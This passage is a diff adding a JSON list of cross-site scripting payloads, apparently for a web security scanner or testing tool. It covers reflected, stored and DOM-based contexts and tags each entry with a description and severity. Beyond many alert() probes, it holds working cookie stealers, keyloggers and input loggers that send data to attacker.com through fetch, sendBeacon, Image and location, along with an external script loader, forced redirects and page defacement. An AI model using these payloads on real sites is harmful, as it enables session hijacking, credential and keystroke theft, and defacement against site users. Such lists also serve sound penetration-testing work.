+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "'><img src=x onerror=alert(\"XSS\")>",
+            "encoded": "'><img src=x onerror=alert(\"XSS\")>",
+            "description": "Single quote image inject",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "attribute",
+            "original": "'><svg onload=alert(\"XSS\")>",
+            "encoded": "'><svg onload=alert(\"XSS\")>",
+            "description": "Single quote SVG inject",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "'; alert('XSS'); //",
+            "encoded": "'; alert('XSS'); //",
+            "description": "Break out of string with semicolon",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "\"; alert(\"XSS\"); //",
+            "encoded": "\"; alert(\"XSS\"); //",
+            "description": "Break out with double quotes",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "';alert(String.fromCharCode(88,83,83));//",
+            "encoded": "';alert(String.fromCharCode(88,83,83));//",
+            "description": "Character code obfuscation",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "';alert(/XSS/);//",
+            "encoded": "';alert(/XSS/);//",
+            "description": "Regular expression in alert",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "`;alert`1`;//",
+            "encoded": "`;alert`1`;//",
+            "description": "Template literal injection",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "\\';alert(1);//",
+            "encoded": "\\';alert(1);//",
+            "description": "Backslash escape attempt",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "';alert(document.domain);//",
+            "encoded": "';alert(document.domain);//",
+            "description": "Alert domain from string",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "';confirm(1);//",
+            "encoded": "';confirm(1);//",
+            "description": "Confirm dialog",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "';prompt(1);//",
+            "encoded": "';prompt(1);//",
+            "description": "Prompt dialog",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "';eval('alert(1)');//",
+            "encoded": "';eval('alert(1)');//",
+            "description": "Eval function call",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "';setTimeout('alert(1)',0);//",
+            "encoded": "';setTimeout('alert(1)',0);//",
+            "description": "SetTimeout injection",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "';setInterval('alert(1)',0);//",
+            "encoded": "';setInterval('alert(1)',0);//",
+            "description": "SetInterval injection",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "*/; alert('XSS'); /*",
+            "encoded": "*/; alert('XSS'); /*",
+            "description": "Break out of multi-line comment",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "<!--*/; alert('XSS'); //-->",
+            "encoded": "<!--*/; alert('XSS'); //-->",
+            "description": "HTML comment escape",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "//\nalert('XSS');//",
+            "encoded": "//\nalert('XSS');//",
+            "description": "Newline comment bypass",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "/**/alert(1);//",
+            "encoded": "/**/alert(1);//",
+            "description": "Empty comment bypass",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "/*!alert(1)*/",
+            "encoded": "/*!alert(1)*/",
+            "description": "MySQL-style comment",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "//*/alert(1);//",
+            "encoded": "//*/alert(1);//",
+            "description": "Double comment escape",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "}; alert('XSS'); //",
+            "encoded": "}; alert('XSS'); //",
+            "description": "Close function and inject",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "); alert('XSS'); //",
+            "encoded": "); alert('XSS'); //",
+            "description": "Close parenthesis and inject",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "]; alert('XSS'); //",
+            "encoded": "]; alert('XSS'); //",
+            "description": "Close array and inject",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "});alert('XSS');//",
+            "encoded": "});alert('XSS');//",
+            "description": "Close nested structures",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "break;alert('XSS');//",
+            "encoded": "break;alert('XSS');//",
+            "description": "Break statement injection",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "reflected",
+            "context": "javascript",
+            "original": "return;alert('XSS');//",
+            "encoded": "return;alert('XSS');//",
+            "description": "Return statement injection",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
+            "encoded": "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
+            "description": "Cookie stealer using fetch API",
+            "severity": "Critical",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<img src=x onerror='location=\"http://attacker.com?c=\"+document.cookie'>",
+            "encoded": "<img src=x onerror='location=\"http://attacker.com?c=\"+document.cookie'>",
+            "description": "Cookie stealer using image error",
+            "severity": "Critical",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<script>new Image().src='http://attacker.com?c='+document.cookie</script>",
+            "encoded": "<script>new Image().src='http://attacker.com?c='+document.cookie</script>",
+            "description": "Cookie stealer using Image object",
+            "severity": "Critical",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<svg onload='fetch(\"http://attacker.com?c=\"+document.cookie)'>",
+            "encoded": "<svg onload='fetch(\"http://attacker.com?c=\"+document.cookie)'>",
+            "description": "SVG-based cookie stealer",
+            "severity": "Critical",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<script>navigator.sendBeacon('http://attacker.com',document.cookie)</script>",
+            "encoded": "<script>navigator.sendBeacon('http://attacker.com',document.cookie)</script>",
+            "description": "Cookie stealer using sendBeacon",
+            "severity": "Critical",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<script>document.location='http://attacker.com?c='+document.cookie</script>",
+            "encoded": "<script>document.location='http://attacker.com?c='+document.cookie</script>",
+            "description": "Cookie stealer using location",
+            "severity": "Critical",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<iframe src=x onload=\"fetch('http://attacker.com?c='+parent.document.cookie)\">",
+            "encoded": "<iframe src=x onload=\"fetch('http://attacker.com?c='+parent.document.cookie)\">",
+            "description": "Iframe cookie stealer",
+            "severity": "Critical",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<script>with(document)with(body)with(appendChild(createElement('script')))src='//attacker.com'</script>",
+            "encoded": "<script>with(document)with(body)with(appendChild(createElement('script')))src='//attacker.com'</script>",
+            "description": "External script loader",
+            "severity": "Critical",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<script>document.onkeypress=function(e){fetch('http://attacker.com?k='+e.key)}</script>",
+            "encoded": "<script>document.onkeypress=function(e){fetch('http://attacker.com?k='+e.key)}</script>",
+            "description": "Simple keylogger",
+            "severity": "Critical",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<script>document.addEventListener('keydown',e=>fetch('//attacker.com?k='+e.key))</script>",
+            "encoded": "<script>document.addEventListener('keydown',e=>fetch('//attacker.com?k='+e.key))</script>",
+            "description": "Keydown event logger",
+            "severity": "Critical",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<script>setInterval(()=>fetch('//attacker.com?v='+document.querySelector('input').value),1000)</script>",
+            "encoded": "<script>setInterval(()=>fetch('//attacker.com?v='+document.querySelector('input').value),1000)</script>",
+            "description": "Input value logger",
+            "severity": "Critical",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<script>document.querySelectorAll('input').forEach(i=>i.addEventListener('input',e=>fetch('//attacker.com?'+e.target.value)))</script>",
+            "encoded": "<script>document.querySelectorAll('input').forEach(i=>i.addEventListener('input',e=>fetch('//attacker.com?'+e.target.value)))</script>",
+            "description": "Multi-input logger",
+            "severity": "Critical",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<script>window.location='http://attacker.com'</script>",
+            "encoded": "<script>window.location='http://attacker.com'</script>",
+            "description": "Page redirect",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<meta http-equiv='refresh' content='0;url=http://attacker.com'>",
+            "encoded": "<meta http-equiv='refresh' content='0;url=http://attacker.com'>",
+            "description": "Meta refresh redirect",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<script>top.location='http://attacker.com'</script>",
+            "encoded": "<script>top.location='http://attacker.com'</script>",
+            "description": "Top frame redirect",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<script>parent.location='http://attacker.com'</script>",
+            "encoded": "<script>parent.location='http://attacker.com'</script>",
+            "description": "Parent frame redirect",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<script>window.open('http://attacker.com','_self')</script>",
+            "encoded": "<script>window.open('http://attacker.com','_self')</script>",
+            "description": "Window.open redirect",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<script>location.replace('http://attacker.com')</script>",
+            "encoded": "<script>location.replace('http://attacker.com')</script>",
+            "description": "Location.replace redirect",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<script>document.body.innerHTML='<h1>Hacked!</h1>'</script>",
+            "encoded": "<script>document.body.innerHTML='<h1>Hacked!</h1>'</script>",
+            "description": "Page defacement",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<script>document.write('<h1>Defaced</h1>')</script>",
+            "encoded": "<script>document.write('<h1>Defaced</h1>')</script>",
+            "description": "Document.write defacement",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<script>document.body.style.background='red'</script>",
+            "encoded": "<script>document.body.style.background='red'</script>",
+            "description": "Background color change",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<script>document.title='Hacked by XSS'</script>",
+            "encoded": "<script>document.title='Hacked by XSS'</script>",
+            "description": "Title change",
+            "severity": "Low",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<script>alert('XSS');document.body.remove()</script>",
+            "encoded": "<script>alert('XSS');document.body.remove()</script>",
+            "description": "Body removal",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<style>body{display:none}</style><h1>Hacked</h1>",
+            "encoded": "<style>body{display:none}</style><h1>Hacked</h1>",
+            "description": "CSS-based hiding",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<img src=x onerror=alert('Stored XSS')>",
+            "encoded": "<img src=x onerror=alert('Stored XSS')>",
+            "description": "Simple stored XSS",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<svg onload=alert('Stored XSS')>",
+            "encoded": "<svg onload=alert('Stored XSS')>",
+            "description": "SVG stored XSS",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<iframe src=javascript:alert('Stored')>",
+            "encoded": "<iframe src=javascript:alert('Stored')>",
+            "description": "Iframe stored XSS",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<script>alert('Stored')</script>",
+            "encoded": "<script>alert('Stored')</script>",
+            "description": "Basic stored script",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<body onload=alert('Stored')>",
+            "encoded": "<body onload=alert('Stored')>",
+            "description": "Body onload stored",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<input onfocus=alert('Stored') autofocus>",
+            "encoded": "<input onfocus=alert('Stored') autofocus>",
+            "description": "Input stored XSS",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<marquee onstart=alert('Stored')>",
+            "encoded": "<marquee onstart=alert('Stored')>",
+            "description": "Marquee stored XSS",
+            "severity": "Low",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<details open ontoggle=alert('Stored')>",
+            "encoded": "<details open ontoggle=alert('Stored')>",
+            "description": "Details stored XSS",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<video src=x onerror=alert('Stored')>",
+            "encoded": "<video src=x onerror=alert('Stored')>",
+            "description": "Video stored XSS",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<audio src=x onerror=alert('Stored')>",
+            "encoded": "<audio src=x onerror=alert('Stored')>",
+            "description": "Audio stored XSS",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<select onfocus=alert('Stored') autofocus>",
+            "encoded": "<select onfocus=alert('Stored') autofocus>",
+            "description": "Select stored XSS",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<textarea onfocus=alert('Stored') autofocus>",
+            "encoded": "<textarea onfocus=alert('Stored') autofocus>",
+            "description": "Textarea stored XSS",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<object data=javascript:alert('Stored')>",
+            "encoded": "<object data=javascript:alert('Stored')>",
+            "description": "Object stored XSS",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<embed src=javascript:alert('Stored')>",
+            "encoded": "<embed src=javascript:alert('Stored')>",
+            "description": "Embed stored XSS",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<button onclick=alert('Stored')>Click</button>",
+            "encoded": "<button onclick=alert('Stored')>Click</button>",
+            "description": "Button stored XSS",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<form action=javascript:alert('Stored')><input type=submit>",
+            "encoded": "<form action=javascript:alert('Stored')><input type=submit>",
+            "description": "Form stored XSS",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<link rel=stylesheet href=data:,*%7Bx:expression(alert('Stored'))%7D>",
+            "encoded": "<link rel=stylesheet href=data:,*%7Bx:expression(alert('Stored'))%7D>",
+            "description": "Link CSS stored",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "html",
+            "original": "<base href=javascript:alert('Stored')//>",
+            "encoded": "<base href=javascript:alert('Stored')//>",
+            "description": "Base tag stored",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "attribute",
+            "original": "\" onfocus=\"fetch('http://attacker.com?c='+document.cookie)\" autofocus=\"",
+            "encoded": "\" onfocus=\"fetch('http://attacker.com?c='+document.cookie)\" autofocus=\"",
+            "description": "Attribute-based cookie stealer",
+            "severity": "Critical",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "attribute",
+            "original": "\"><img src=x onerror=\"location='http://attacker.com?c='+document.cookie\">",
+            "encoded": "\"><img src=x onerror=\"location='http://attacker.com?c='+document.cookie\">",
+            "description": "Break out and steal cookie",
+            "severity": "Critical",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "attribute",
+            "original": "\" onclick=\"alert('Stored XSS')",
+            "encoded": "\" onclick=\"alert('Stored XSS')",
+            "description": "Stored onclick handler",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "attribute",
+            "original": "\" onload=\"alert('Stored')",
+            "encoded": "\" onload=\"alert('Stored')",
+            "description": "Stored onload handler",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "attribute",
+            "original": "\" onerror=\"alert('Stored')",
+            "encoded": "\" onerror=\"alert('Stored')",
+            "description": "Stored onerror handler",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "attribute",
+            "original": "\" onmouseover=\"alert('Stored')",
+            "encoded": "\" onmouseover=\"alert('Stored')",
+            "description": "Stored onmouseover",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "attribute",
+            "original": "' onclick='alert(\"Stored\")'",
+            "encoded": "' onclick='alert(\"Stored\")'",
+            "description": "Single quote stored onclick",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "attribute",
+            "original": "'><script>alert(\"Stored\")</script>",
+            "encoded": "'><script>alert(\"Stored\")</script>",
+            "description": "Single quote tag injection",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "attribute",
+            "original": "\" autofocus onfocus=\"alert(1)",
+            "encoded": "\" autofocus onfocus=\"alert(1)",
+            "description": "Autofocus attribute attack",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "attribute",
+            "original": "\" style=\"x:expression(alert(1))\"",
+            "encoded": "\" style=\"x:expression(alert(1))\"",
+            "description": "CSS expression attack",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "javascript",
+            "original": "'; fetch('http://attacker.com?c='+document.cookie); //",
+            "encoded": "'; fetch('http://attacker.com?c='+document.cookie); //",
+            "description": "JS context cookie stealer",
+            "severity": "Critical",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "javascript",
+            "original": "\"; window.location=\"http://attacker.com\"; //",
+            "encoded": "\"; window.location=\"http://attacker.com\"; //",
+            "description": "JS context redirect",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "javascript",
+            "original": "';document.write('<img src=x onerror=alert(1)>');//",
+            "encoded": "';document.write('<img src=x onerror=alert(1)>');//",
+            "description": "Document.write injection",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "javascript",
+            "original": "';eval(atob('YWxlcnQoMSk='));//",
+            "encoded": "';eval(atob('YWxlcnQoMSk='));//",
+            "description": "Base64 eval injection",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "javascript",
+            "original": "';setTimeout(alert(1),0);//",
+            "encoded": "';setTimeout(alert(1),0);//",
+            "description": "SetTimeout stored",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "javascript",
+            "original": "';Function('alert(1)')();//",
+            "encoded": "';Function('alert(1)')();//",
+            "description": "Function constructor",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "javascript",
+            "original": "';\\u0061lert(1);//",
+            "encoded": "';\\u0061lert(1);//",
+            "description": "Unicode escape",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "stored",
+            "context": "javascript",
+            "original": "';alert(String.fromCharCode(88,83,83));//",
+            "encoded": "';alert(String.fromCharCode(88,83,83));//",
+            "description": "CharCode stored",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "html",
+            "original": "<img src=x onerror=alert(document.domain)>",
+            "encoded": "<img src=x onerror=alert(document.domain)>",
+            "description": "DOM-based XSS showing domain",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "html",
+            "original": "#<script>alert('DOM XSS')</script>",
+            "encoded": "#<script>alert('DOM XSS')</script>",
+            "description": "Hash fragment injection",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "html",
+            "original": "<svg onload=alert(window.location)>",
+            "encoded": "<svg onload=alert(window.location)>",
+            "description": "Show current location",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "html",
+            "original": "<img src=x onerror=alert(document.URL)>",
+            "encoded": "<img src=x onerror=alert(document.URL)>",
+            "description": "Display document URL",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "html",
+            "original": "\"><svg onload=alert(1)>",
+            "encoded": "\"><svg onload=alert(1)>",
+            "description": "Break out for DOM manipulation",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "html",
+            "original": "<img src=x onerror=alert(document.referrer)>",
+            "encoded": "<img src=x onerror=alert(document.referrer)>",
+            "description": "Display referrer",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "html",
+            "original": "<img src=x onerror=alert(location.hash)>",
+            "encoded": "<img src=x onerror=alert(location.hash)>",
+            "description": "Display hash",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "html",
+            "original": "<img src=x onerror=alert(location.search)>",
+            "encoded": "<img src=x onerror=alert(location.search)>",
+            "description": "Display search params",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "html",
+            "original": "<img src=x onerror=alert(document.baseURI)>",
+            "encoded": "<img src=x onerror=alert(document.baseURI)>",
+            "description": "Display base URI",
+            "severity": "Medium",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "html",
+            "original": "<script>alert(location.href)</script>",
+            "encoded": "<script>alert(location.href)</script>",
+            "description": "Alert href",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "html",
+            "original": "<script>alert(document.documentURI)</script>",
+            "encoded": "<script>alert(document.documentURI)</script>",
+            "description": "Alert document URI",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "html",
+            "original": "<iframe src=javascript:alert(parent.document.domain)>",
+            "encoded": "<iframe src=javascript:alert(parent.document.domain)>",
+            "description": "Parent domain access",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "html",
+            "original": "<img src=x onerror=eval(location.hash.slice(1))>",
+            "encoded": "<img src=x onerror=eval(location.hash.slice(1))>",
+            "description": "Eval from hash",
+            "severity": "Critical",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "html",
+            "original": "<img src=x onerror=eval(atob(location.hash.slice(1)))>",
+            "encoded": "<img src=x onerror=eval(atob(location.hash.slice(1)))>",
+            "description": "Base64 hash eval",
+            "severity": "Critical",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "html",
+            "original": "<img src=x onerror=document.write(location.hash)>",
+            "encoded": "<img src=x onerror=document.write(location.hash)>",
+            "description": "Write hash to document",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "attribute",
+            "original": "\" onload=\"alert(document.domain)",
+            "encoded": "\" onload=\"alert(document.domain)",
+            "description": "DOM attribute injection",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "attribute",
+            "original": "\" onfocus=\"alert(document.URL)\" autofocus=\"",
+            "encoded": "\" onfocus=\"alert(document.URL)\" autofocus=\"",
+            "description": "DOM-based attribute XSS",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "attribute",
+            "original": "\" onclick=\"alert(location.href)",
+            "encoded": "\" onclick=\"alert(location.href)",
+            "description": "DOM onclick href",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "attribute",
+            "original": "\" onerror=\"alert(location.hash)",
+            "encoded": "\" onerror=\"alert(location.hash)",
+            "description": "DOM onerror hash",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "attribute",
+            "original": "'onclick='alert(document.domain)'",
+            "encoded": "'onclick='alert(document.domain)'",
+            "description": "Single quote DOM attack",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "attribute",
+            "original": "\"><img src=x onerror=alert(document.URL)>",
+            "encoded": "\"><img src=x onerror=alert(document.URL)>",
+            "description": "DOM image injection",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "javascript",
+            "original": "javascript:alert(document.domain)",
+            "encoded": "javascript:alert(document.domain)",
+            "description": "JavaScript protocol handler",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "javascript",
+            "original": "javascript:alert(document.cookie)",
+            "encoded": "javascript:alert(document.cookie)",
+            "description": "JavaScript protocol cookie access",
+            "severity": "Critical",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "javascript",
+            "original": "javascript:alert(location.href)",
+            "encoded": "javascript:alert(location.href)",
+            "description": "JavaScript protocol href",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "javascript",
+            "original": "javascript:void(alert(document.domain))",
+            "encoded": "javascript:void(alert(document.domain))",
+            "description": "JavaScript void function",
+            "severity": "High",
+            "encoding_used": "none"
+        },
+        {
+            "type": "dom",
+            "context": "javascript",
+            "original": "data:text/html,<script>alert(parent.document.domain)</script>",
+            "encoded": "data:text/html,<script>alert(parent.document.domain)</script>",
+            "description": "Data URI DOM access",
+            "severity": "High",
+            "encoding_used": "none"
+        }
+    ]
+}
